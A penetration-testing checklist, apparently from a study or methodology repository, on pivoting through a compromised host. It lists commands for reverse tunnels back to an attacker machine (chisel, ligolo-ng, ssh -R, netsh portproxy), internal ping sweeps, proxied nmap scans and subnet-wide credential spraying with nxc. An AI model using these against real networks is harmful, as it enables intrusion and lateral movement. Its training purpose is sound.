# 07 — Pivoting & Tunneling

**Jump to:** [Confirm there's a second network first](#confirm-theres-a-second-network-first) · [Scan the new subnet from the foothold (before you tunnel)](#scan-the-new-subnet-from-the-foothold-before-you-tunnel) · [Pick a tunneling method (in order of preference)](#pick-a-tunneling-method-in-order-of-preference) · [Once you have a tunnel](#once-you-have-a-tunnel) · [Common breakages](#common-breakages) · [Windows-native pivoting (when you can't upload binaries)](#windows-native-pivoting-when-you-cant-upload-binaries) · [Confirm the pivot before you build on it](#confirm-the-pivot-before-you-build-on-it)

Trigger: you have a foothold on a host with a second network interface / can see a subnet you couldn't reach from Kali.
Reference: [Windows Pivoting](../5-lateral-movement/05-windows-pivoting.md).

## Confirm there's a second network first

- [ ] Linux: `ip a; ip route; cat /etc/resolv.conf`.
- [ ] Windows: `ipconfig /all; route print`.
- [ ] Look for interfaces with a subnet not in your VPN tun0. That's the reason to pivot.

## Scan the new subnet from the foothold (before you tunnel)

- [ ] Linux: `for i in {1..254}; do (ping -c1 -W1 10.10.20.$i >/dev/null && echo 10.10.20.$i) & done; wait`.
- [ ] Windows: `for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.20.%i | find "Reply"`.
- [ ] Note which internal IPs answer. That's your pivot target list.

## Pick a tunneling method (in order of preference)

### Chisel (best all-around — TCP tunnel over HTTP)

- [ ] Kali (server): `chisel server -p 8000 --reverse`.
- [ ] Victim (client, reverse): `./chisel client <kali-ip>:8000 R:socks`.
- [ ] Point tools at the SOCKS proxy: `proxychains nmap -sT -Pn 10.10.20.5`.
- [ ] Or forward a single port: `./chisel client <kali-ip>:8000 R:3389:10.10.20.5:3389` → RDP to `<kali-ip>:3389`.

### SSH (when you have creds/keys on the pivot)

- [ ] Dynamic SOCKS: `ssh -D 1080 -N user@<pivot>`.
- [ ] Local forward (single port): `ssh -L 3389:<internal>:3389 user@<pivot>`.
- [ ] Remote forward (pivot → Kali): `ssh -R 8000:127.0.0.1:8000 user@<kali>`.
- [ ] Use `-f -N` to background without a shell.

### Ligolo-ng (fast, TAP-based, no proxychains needed)

- [ ] Kali (proxy): `./proxy -selfcert`.
- [ ] Kali (interface): `sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; sudo ip route add 10.10.20.0/24 dev ligolo`.
- [ ] Victim (agent): `./agent -connect <kali-ip>:11601 -ignore-cert`.
- [ ] In the proxy console: `session; start`. Now Kali can hit `10.10.20.5` natively.

### Metasploit route (only if the foothold shell is a meterpreter)

- [ ] `run autoroute -s 10.10.20.0/24`.
- [ ] Use msf-internal scanners or set up `auxiliary/server/socks_proxy` for external tools.

## Once you have a tunnel

- [ ] `proxychains nmap -sT -Pn -T4 --top-ports 100 10.10.20.5` (Nmap must be TCP-connect through proxy).
- [ ] `proxychains nxc smb 10.10.20.0/24` — spray creds across the new subnet.
- [ ] Web apps: point Burp at the SOCKS proxy (User options → SOCKS proxy).
- [ ] RDP/WinRM: forward the specific port with `chisel client ... R:3389:target:3389`.

## Common breakages

- [ ] **`proxychains: tcp connect refused`** — target IP is wrong or the pivot can't reach it. Verify from the foothold shell first (`nc -zv <target> <port>`).
- [ ] **`ICMP` isn't tunneled** — Ping doesn't traverse a SOCKS proxy. Use `-Pn` on nmap.
- [ ] **UDP scans don't work through SOCKS** — Chisel/Ligolo can bridge; proxychains alone cannot.
- [ ] **Ligolo interface stops routing** — bring it down and back up, re-add the route.
- [ ] **`nxc` on macOS through proxychains** — set `dns_proxy` in `/etc/proxychains.conf`, not `strict_chain`.

## Windows-native pivoting (when you can't upload binaries)

- [ ] `netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.20.5`.
- [ ] PowerShell reverse SOCKS via `Invoke-SocksProxy.ps1` (from BC-SECURITY / PowerSploit branches).

## Confirm the pivot before you build on it

- [ ] From Kali, run a scan against the new subnet through the tunnel — confirm `tun0` (or the SOCKS proxychain) actually reaches it before you commit an hour of enum to it.
- [ ] Note the pivot chain in your ops log: `Kali → 10.10.10.5 (foothold) → 10.10.20.5 (target)`. Future-you needs to know which hop broke when the chain drops.
